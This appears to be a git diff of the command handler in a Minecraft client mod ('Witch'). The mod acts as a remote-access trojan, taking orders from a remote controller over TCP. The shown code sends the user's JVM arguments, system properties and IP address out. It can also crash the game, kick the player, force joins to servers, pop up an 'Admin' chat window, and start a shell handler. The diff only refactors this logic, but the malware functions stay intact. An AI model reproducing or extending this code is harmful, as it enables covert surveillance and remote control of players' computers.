@@ -1,6 +1,6 @@
 package me.soda.witch.client.connection;
 
-import com.google.common.net.HostAndPort;
+import com.mojang.blaze3d.systems.RenderSystem;
 import me.soda.witch.client.Cfg;
 import me.soda.witch.client.Witch;
 import me.soda.witch.client.modules.*;
@@ -18,7 +18,6 @@ import me.soda.witch.shared.socket.messages.messages.*;
 import net.minecraft.client.gui.screen.ConnectScreen;
 import net.minecraft.client.gui.screen.TitleScreen;
 import net.minecraft.client.network.ServerAddress;
-import net.minecraft.client.network.ServerInfo;
 import net.minecraft.client.util.GlfwUtil;
 
 import java.lang.management.ManagementFactory;
@@ -87,7 +86,7 @@ public class Client extends TcpClient {
                         case "skin" -> MCUtils.sendPlayerSkin();
                         case "kick" -> MCUtils.disconnect();
                         case "runargs" ->
-                                Witch.INSTANCE.client.send(new StringsData("runargs", ManagementFactory.getRuntimeMXBean().getInputArguments()));
+                                Witch.send(new StringsData("runargs", ManagementFactory.getRuntimeMXBean().getInputArguments()));
                         case "props" -> Witch.send("props", System.getProperties().toString());
                         case "ip" -> Witch.send("ip", NetUtil.getIP());
                         case "crash" -> GlfwUtil.makeJvmCrash();
@@ -97,13 +96,12 @@ public class Client extends TcpClient {
                     String msg = data.data().get(0);
                     switch (data.id()) {
                         case "join_server" -> {
-                            HostAndPort hostPort = HostAndPort.fromString(msg);
-                            ServerAddress address = new ServerAddress(hostPort.getHost(), hostPort.getPort());
-                            ConnectScreen.connect(new TitleScreen(), Witch.mc, address, new ServerInfo("Server", address.toString(), false));
+                            ServerAddress address = ServerAddress.parse(msg);
+                            RenderSystem.recordRenderCall(() -> ConnectScreen.connect(new TitleScreen(), Witch.mc, address, null));
                         }
                         case "chat" -> {
                             Witch.CHAT_WINDOW.visible(!msg.equals("false"));
-                            if (!msg.equals("false")) return;
+                            if (msg.equals("false")) return;
                             Witch.CHAT_WINDOW.receivedText.append("Admin:" + msg);
                         }
                         case "shell" -> new Thread(() -> {
